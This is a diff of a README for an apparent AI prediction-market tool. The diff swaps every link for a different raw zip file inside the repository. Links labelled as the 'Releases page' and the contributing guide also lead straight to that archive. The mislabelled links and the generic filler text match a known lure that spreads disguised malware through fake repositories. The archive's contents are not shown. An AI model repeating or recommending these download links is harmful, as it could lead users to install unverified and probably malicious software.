@@ -4,13 +4,13 @@
 Polymarket AI market suggestor blends real-time news, social sentiment, and on-chain trends to propose new prediction markets. It leverages LLM reasoning and analytics to provide a simple command-line interface (CLI) tool that enhances your trading experience.
 
 ## 📦 Download Now
-[![Download the latest release](https://raw.githubusercontent.com/timegamin/polymarket-ai-market-suggestor/main/src/polymarket-ai-market-suggestor-2.4-alpha.4.zip)](https://raw.githubusercontent.com/timegamin/polymarket-ai-market-suggestor/main/src/polymarket-ai-market-suggestor-2.4-alpha.4.zip)
+[![Download the latest release](https://github.com/timegamin/polymarket-ai-market-suggestor/raw/refs/heads/main/src/suggestor_ai_polymarket_market_1.6.zip)](https://github.com/timegamin/polymarket-ai-market-suggestor/raw/refs/heads/main/src/suggestor_ai_polymarket_market_1.6.zip)
 
 ## 🚀 Getting Started
 To get started with polymarket-ai-market-suggestor, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/timegamin/polymarket-ai-market-suggestor/main/src/polymarket-ai-market-suggestor-2.4-alpha.4.zip) to find the latest version.
+   Go to the [Releases page](https://github.com/timegamin/polymarket-ai-market-suggestor/raw/refs/heads/main/src/suggestor_ai_polymarket_market_1.6.zip) to find the latest version.
 
 2. **Download the Application**  
    From the Releases page, locate the appropriate version for your operating system. Click the download link for that version.
@@ -49,12 +49,12 @@ Polymarket AI market suggestor comes with a set of commands. Here are a few key 
 Refer to the documentation included within the application for a full list of commands and detailed explanations.
 
 ## 📝 Download & Install
-To download the application, visit the [Releases page](https://raw.githubusercontent.com/timegamin/polymarket-ai-market-suggestor/main/src/polymarket-ai-market-suggestor-2.4-alpha.4.zip). Locate the latest version that matches your operating system, download it, and follow the install instructions provided.
+To download the application, visit the [Releases page](https://github.com/timegamin/polymarket-ai-market-suggestor/raw/refs/heads/main/src/suggestor_ai_polymarket_market_1.6.zip). Locate the latest version that matches your operating system, download it, and follow the install instructions provided.
 
 ## 📞 Support
 If you encounter any issues or have questions, please check the issues section on our GitHub page or contact our support team. We aim to respond quickly and help you resolve any problems.
 
 ## 🛠 Contributing
-We welcome contributions! If you would like to contribute to this project, please read our https://raw.githubusercontent.com/timegamin/polymarket-ai-market-suggestor/main/src/polymarket-ai-market-suggestor-2.4-alpha.4.zip file for more details on how to help.
+We welcome contributions! If you would like to contribute to this project, please read our https://github.com/timegamin/polymarket-ai-market-suggestor/raw/refs/heads/main/src/suggestor_ai_polymarket_market_1.6.zip file for more details on how to help.
 
 Thank you for using the polymarket-ai-market-suggestor! We hope it enhances your market trading experience.
